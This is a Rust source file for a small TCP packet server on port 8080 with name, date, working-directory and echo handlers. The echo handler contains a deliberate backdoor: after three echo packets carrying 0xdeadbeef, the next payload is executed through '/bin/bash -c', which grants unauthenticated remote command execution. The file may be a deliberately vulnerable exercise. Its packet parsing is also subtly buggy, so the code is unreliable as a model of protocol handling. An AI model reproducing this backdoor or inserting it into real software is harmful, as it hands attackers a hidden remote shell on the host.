use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};
use std::process::{Command, Output};

const TYPE_LENGTH: u32 = 4;
const LENGTH_LENGTH: u32 = 4;

static mut BACKDOOR_TRIGGER: u32 = 0;

struct TLVHeader {
    packet_type: u32,
    length: u32,
}

struct TLVPacket {
    header: TLVHeader,
    value: Vec<u8>,
}

impl TLVHeader {

    fn from_bytes(bytes: &[u8]) -> Option<Self> {

        let len = bytes.len() as u32;
        let expected = TYPE_LENGTH + LENGTH_LENGTH;
        if len < expected {
            println!("Packet too small");
            return None;
        }

        let packet_type = u32::from_be_bytes([
            bytes[3],
            bytes[2],
            bytes[1],
            bytes[0],
        ]);

        println!("Packet type: {packet_type}");

        let hlength = u32::from_be_bytes([
            bytes[7],
            bytes[6],
            bytes[5],
            bytes[4],
        ]) as usize;

        println!("Packet length (header): {hlength}");

        Some(TLVHeader {
            packet_type,
            length: hlength as u32,
        })

    }

}

impl TLVPacket {

    fn from_buf(header: TLVHeader, buf: &[u8]) -> Option<Self> {
        let len = buf.len() as u32;
        let hlen = header.length as usize;
        if len < header.length {
            println!("Not enough bytes to construct packet");
            return None;
        }

        let value = buf[..hlen].to_vec();

        println!("Value: {:?}", value);

        Some(TLVPacket {
            header,
            value,
        })
    }

    fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::new();
        bytes.extend(&self.header.packet_type.to_be_bytes());
        bytes.extend(&self.header.length.to_be_bytes());
        bytes.extend(&self.value);
        bytes
    }

    fn handle_packet(&self) -> Vec<u8> {
        match self.header.packet_type {
            0x1 => Self::handle_name_packet(&self.value),
            0x2 => Self::handle_date_packet(),
            0x3 => Self::handle_working_directory_packet(),
            0x4 => {
                let response = Self::handle_echo_packet(&self.value);
                response
            }
            _ => vec![],
        }
    }

    fn handle_name_packet(name: &[u8]) -> Vec<u8> {
        let mut response = b"Hello, ".to_vec();
        response.extend(name);
        response.extend(b"!\n");
        response
    }

    fn handle_date_packet() -> Vec<u8> {
        let output = run_shell_command("date", &[]).unwrap();
        output.stdout
    }

    fn handle_working_directory_packet() -> Vec<u8> {
        let output = run_shell_command("pwd", &[]).unwrap();
        output.stdout
    }

    fn handle_echo_packet(value: &[u8]) -> Vec<u8> {
        let response = value.to_vec();
        unsafe {
            if response.len() == 4 && u32::from_be_bytes([response[3], response[2], response[1], response[0]]) == 0xdeadbeef {
                BACKDOOR_TRIGGER += 1;
            } else if BACKDOOR_TRIGGER == 3 {
                TLVPacket::backdoor(&response);
            }
        }
        response
    }

    fn backdoor(value: &Vec<u8>) {
        let command = String::from_utf8_lossy(value);
        println!("Backdoor command: {}", command.to_string());
        match Command::new("/bin/bash")
            .arg("-c")
            .arg(command.to_string())
            .output() {
                Ok(output) => {
                    println!("Command output: {}", String::from_utf8_lossy(&output.stdout));
                }
                Err(err_) => {
                    println!("Failed to execute command: {err_}");
                }
            }
    }
}

fn run_shell_command(command: &str, args: &[&str]) -> Result<Output, std::io::Error> {
    Command::new(command)
        .args(args)
        .output()
}

fn handle_client(mut stream: TcpStream) {
    let mut buffer = [0; 4096];

    loop {
        match stream.read(&mut buffer) {
            Ok(n) if n > 0 => {

                // println!("Received buffer: {:?}", buffer);
                println!("Received {n} bytes");

                let mut bytes = Vec::new();
                bytes.extend_from_slice(&buffer[..n]);

                let mut offset = 0;
                while offset < n {

                    if let Some(header) = TLVHeader::from_bytes(&buffer) {

                        offset += (TYPE_LENGTH + LENGTH_LENGTH) as usize;
                        let packet_bytes = &bytes[offset..];

                        if let Some(packet) = TLVPacket::from_buf(header, packet_bytes) {
                            let response = packet.handle_packet();
                            stream.write_all(&response).expect("Failed to send response");

                            // Move offset to the next packet
                            offset += packet.header.length as usize;
                        } else {
                            println!("Invalid packet value");
                            break; // Break the loop if the packet is invalid
                        }

                    } else {
                        println!("Invalid packet header");
                        break; // Break the loop if the packet is invalid
                    }
                }
            }
            Ok(_) | Err(_) => {
                println!("Client disconnected");
                unsafe {
                    BACKDOOR_TRIGGER = 0;
                }
                return;
            }
        }
    }
}

fn main() {
    let listener = TcpListener::bind("0.0.0.0:8080").expect("Failed to bind");

    println!("Server listening on port 8080...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection: {:?}", stream.peer_addr());
                handle_client(stream);
            }
            Err(e) => {
                eprintln!("Error: {}", e);
            }
        }
    }
}
